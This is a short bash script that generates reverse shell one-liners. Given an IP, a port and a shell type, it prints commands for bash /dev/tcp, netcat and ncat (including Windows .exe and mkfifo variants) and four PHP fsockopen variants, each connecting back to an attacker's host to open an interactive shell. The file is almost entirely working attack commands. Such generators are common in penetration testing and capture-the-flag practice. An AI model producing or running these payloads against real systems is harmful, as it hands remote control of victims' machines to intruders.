#!/bin/bash

while getopts i:p:s: flag
do
    case "${flag}" in
        i) IP=${OPTARG};;
        p) PORT=${OPTARG};;
        s) shell_type=${OPTARG};;
    esac
done

case $shell_type in
	bash)
		echo -n "sh -i >& /dev/tcp/$IP/$PORT 0>&1"
		;;
	nc)
		echo -n "nc -e sh $IP $PORT"
		;;
	nc-exe)
		echo -n "nc.exe -e sh $IP $PORT"
		;;
	nc-mkfifo)
		echo -n "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $IP $PORT >/tmp/f"
		;;
	ncat)
		echo -n "ncat $IP $PORT -e sh"
		;;
	ncat-exe)
		echo -n "ncat.exe $IP $PORT -e sh"
		;;
	php-exec)
		echo -n "php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"sh <&3 >&3 2>&3\");'"
		;;
	php-shell_exec)
		echo -n "php -r '\$sock=fsockopen(\"$IP\",$PORT);shell_exec(\"sh <&3 >&3 2>&3\");'"
		;;
	php-system)
		echo -n "php -r '\$sock=fsockopen(\"$IP\",$PORT);system(\"sh <&3 >&3 2>&3\");'"
		;;
	php-passthru)
		echo -n "php -r '\$sock=fsockopen(\"$IP\",$PORT);passthru(\"sh <&3 >&3 2>&3\");'"
		;;

	*)
		echo "Something went wrong...";
		echo "shell_type: bash, nc,nc-exe, nc-mkfifo, ncat, ncat-exe, php-exec, php-shell_exec, php-system, php-passthru";
		echo "";
		echo "--------------------------------------------------------";
		echo "Usage: gen_revshell.sh -i <IP> -p <PORT> -s <shell_type>";
		;;
esac
